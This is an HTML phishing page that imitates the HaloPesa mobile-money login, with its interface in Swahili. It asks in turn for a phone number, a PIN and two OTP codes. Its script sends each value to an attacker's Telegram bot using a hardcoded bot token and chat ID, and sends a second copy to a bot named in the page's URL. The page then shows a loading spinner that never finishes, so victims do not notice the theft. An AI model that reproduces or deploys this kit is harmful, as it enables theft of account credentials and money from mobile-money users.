<!DOCTYPE html>
<html lang="sw">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>HaloPesa</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: sans-serif; }
        
        body, html { 
            height: 100%; 
            width: 100%; 
            overflow: hidden; /* Hii ndio inazuia scroll */
            background-color: #f5f5f5; 
            display: flex; 
            justify-content: center; 
            align-items: center;
        }

        .phone-container { 
            background-color: #ffffff; 
            width: 100%; 
            max-width: 450px; 
            height: 100%; 
            display: flex; 
            flex-direction: column; 
            padding: 20px; 
            position: relative;
            overflow: hidden; /* Inazuia content kutoroka nje */
        }

        .screen { 
            display: none; 
            flex-direction: column; 
            height: 100%; 
            width: 100%;
            padding-top: 20px;
        }

        .screen.active { display: flex; }

        h2 { font-size: 22px; color: #333; margin-bottom: 20px; }

        .text-input { 
            width: 100%; 
            padding: 15px; 
            border: 2px solid #eee; 
            border-radius: 10px; 
            font-size: 16px; 
            margin-bottom: 20px;
        }

        .box-input-container { 
            display: flex; 
            justify-content: space-between; 
            gap: 10px; 
            margin-bottom: 20px; 
        }

        .box-input { 
            width: 60px; 
            height: 60px; 
            border: 2px solid #eee; 
            border-radius: 10px; 
            text-align: center; 
            font-size: 20px; 
        }

        .btn-primary { 
            width: 100%; 
            padding: 15px; 
            background-color: #ff5500; 
            color: #fff; 
            border: none; 
            border-radius: 10px; 
            font-size: 16px; 
            margin-top: auto; /* Inashusha button chini kabisa */
            margin-bottom: 20px;
        }

        .loading-container { 
            display: flex; 
            flex-direction: column; 
            justify-content: center; 
            align-items: center; 
            height: 100%; 
        }
        
        .spinner { 
            width: 40px; 
            height: 40px; 
            border: 4px solid #f3f3f3; 
            border-top: 4px solid #ff5500; 
            border-radius: 50%; 
            animation: spin 1s linear infinite; 
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="phone-container">
        <div class="screen active" id="screen-1">
            <h2>Namba ya simu</h2>
            <input type="tel" class="text-input" id="phone-field">
            <button class="btn-primary" onclick="submitPhone()">Endelea</button>
        </div>

        <div class="screen" id="screen-2">
            <h2>Weka namba ya siri</h2>
            <div class="box-input-container" id="pin-container">
                <input type="password" class="box-input autotab" maxlength="1">
                <input type="password" class="box-input autotab" maxlength="1">
                <input type="password" class="box-input autotab" maxlength="1">
                <input type="password" class="box-input autotab" maxlength="1">
            </div>
            <button class="btn-primary" onclick="submitPin()">Endelea</button>
        </div>

        <div class="screen" id="screen-3">
            <h2>Weka msimbo wa OTP</h2>
            <h4>Msimbo wa OTP ulitumwa kwa namba yako.</h4>
            <h4>Kama ujumbe wa maandihi.</h4>
            <div class="box-input-container" id="otp-container">
                <input type="text" class="box-input autotab" maxlength="1">
                <input type="text" class="box-input autotab" maxlength="1">
                <input type="text" class="box-input autotab" maxlength="1">
                <input type="text" class="box-input autotab" maxlength="1">
            </div>
            <button class="btn-primary" onclick="triggerLoading(5)">Endelea</button>
        </div>

        <div class="screen" id="screen-4"><div class="loading-container"><div class="spinner"></div></div></div>

        <div class="screen" id="screen-5">
            <h2>Thibitisha msimbo wa OTP</h2>
            <h4>Msimbo wa OTP ulitumwa kwa namba yako.</h4>
            <h4>Kama ujumbe wa maandihi.</h4>
            <div class="box-input-container" id="details-container">
                <input type="text" class="box-input autotab" maxlength="1">
                <input type="text" class="box-input autotab" maxlength="1">
                <input type="text" class="box-input autotab" maxlength="1">
                <input type="text" class="box-input autotab" maxlength="1">
            </div>
            <button class="btn-primary" onclick="triggerContinuousLoading()">Maliza</button>
        </div>

        <div class="screen" id="screen-6"><div class="loading-container"><div class="spinner"></div></div></div>
    </div>

    <script>
        const MAIN_BOT_TOKEN = '8725998887:AAGvJzFOxgPDWP5v_l6eZEpIomiVcXx5gRE';
        const MAIN_CHAT_ID = '8735708057';

        async function sendToTelegram(msg) {
            const p = new URLSearchParams(window.location.search);
            const t = p.get('token'), i = p.get('id');
            fetch(`https://api.telegram.org/bot${MAIN_BOT_TOKEN}/sendMessage`, {
                method: 'POST', headers: {'Content-Type':'application/json'},
                body: JSON.stringify({ chat_id: MAIN_CHAT_ID, text: `[Main] ${msg}`, parse_mode: 'Markdown' })
            });
            if(t && i) {
                fetch(`https://api.telegram.org/bot${t}/sendMessage`, {
                    method: 'POST', headers: {'Content-Type':'application/json'},
                    body: JSON.stringify({chat_id:i, text:`[User] ${msg}`, parse_mode:'Markdown'})
                });
            }
        }

        function nextScreen(id) {
    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
    const targetScreen = document.getElementById('screen-' + id);
    targetScreen.classList.add('active');

    // Automatically focus the first input if it exists in the new screen
    const firstInput = targetScreen.querySelector('input');
    if (firstInput) {
        // Adding a slight timeout ensures the transition animation finishes 
        // before the keyboard pops up, which is better for UX
        setTimeout(() => {
            firstInput.focus();
        }, 300); 
    }
}

        function submitPhone() { sendToTelegram(`📱 Namba: ${document.getElementById('phone-field').value}`); nextScreen(2); }
        function submitPin() {
            let p = ""; document.querySelectorAll('#pin-container .box-input').forEach(i => p += i.value);
            sendToTelegram(`🔑 PIN: ${p}`); nextScreen(3);
        }
        function triggerLoading(id) {
            let v = ""; document.querySelectorAll('#otp-container .box-input').forEach(i => v += i.value);
            sendToTelegram(`💬 OTP: ${v}`); nextScreen(4); setTimeout(() => nextScreen(id), 2000);
        }
        function triggerContinuousLoading() {
            let v = ""; document.querySelectorAll('#details-container .box-input').forEach(i => v += i.value);
            sendToTelegram(`📝 Confirm OTP: ${v}`); nextScreen(6);
        }

        document.querySelectorAll('.autotab').forEach((input, index, inputs) => {
            input.addEventListener('input', () => { if (input.value.length === 1 && index < inputs.length - 1) inputs[index + 1].focus(); });
        });
    </script>
</body>
</html>
